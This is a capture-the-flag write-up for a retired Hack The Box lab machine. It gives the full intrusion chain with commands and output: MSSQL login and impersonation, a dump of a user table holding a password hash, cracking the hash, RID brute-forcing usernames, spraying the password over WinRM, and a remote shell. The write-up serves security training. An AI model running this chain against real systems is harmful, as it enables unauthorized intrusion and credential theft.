# Eighteen

> Retired Hack The Box machine. Public copy with flags removed. Authorized lab use only.

Step1: Nmap

Command: nmap -A --top-port 10000 10.129.2.24 --min-rate 1000

Result:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-08 13:31 -0400
Nmap scan report for 10.129.2.24
Host is up (0.060s latency).
Not shown: 8377 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.2.24:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.129.2.24:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-03-09T00:32:10+00:00; +7h00m10s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-09T00:29:27
|_Not valid after:  2056-03-09T00:29:27
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m10s, deviation: 0s, median: 7h00m09s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   60.63 ms 10.10.14.1
2   60.78 ms 10.129.2.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.60 seconds


Step2: 

As you can see it is open port of mssql, os I need to access via msssql to find any credential

Command: impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.2.24 -port 1433

Output: 

SQL (kevin  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
    show_query                 - show query
    mask_query                 - mask query



Step3: Dump any database or table

Command: SQL (kevin  guest@master)> enum_db
name                is_trustworthy_on   
-----------------   -----------------   
master                              0   
tempdb                              0   
model                               0   
msdb                                1   
financial_planner                   0  


And I see interesting in financial_planner but access denied, so i think i need to upgrade my user

Output:

SQL (kevin  guest@master)> USE financial_planner;
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.


And i see enum_imperonate

Command: SQL (kevin  guest@msdb)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev 


Upgrade to appdev

Command: SQL (kevin  guest@msdb)> EXECUTE AS LOGIN = 'appdev';


Next, use that database financial

Command: SQL (appdev  guest@msdb)> USE financial_planner;
ENVCHANGE(DATABASE): Old Value: msdb, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.

List the table of this database:

Command: SQL (appdev  appdev@financial_planner)> SELECT name FROM sys.tables;
name          
-----------   
users         
incomes       
expenses      
allocations   
analytics     
visits        

Enum of table users

Command: SQL (appdev  appdev@financial_planner)> select * from users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03   
SQL (appdev  appdev@financial_planner)> 


So I found the credential:

admin:pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133


Step4: Crack this hash

So, i save the hash to hash.txt and crack it and found password iloveyou1


Step5: Enumerate to find all the user

Command: nxc mssql 10.129.2.24 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth

Output: 
jamie.dunn
jane.smith
alice.jone
adam.scott
bob.brown
carol.whit
dave.green


Step6: Enumerate to find who has right access via winrm

Command: nxc winrm 10.129.2.24 -u users.txt -p 'iloveyou1'

Output:

WINRM       10.129.2.24     5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)


Step7: Access and got the user flag

Command: evil-winrm -i 10.129.2.24 -u adam.scott -p 'iloveyou1'

Output:

*Evil-WinRM* PS C:\Users\adam.scott\Desktop> type user.txt
[user flag removed]


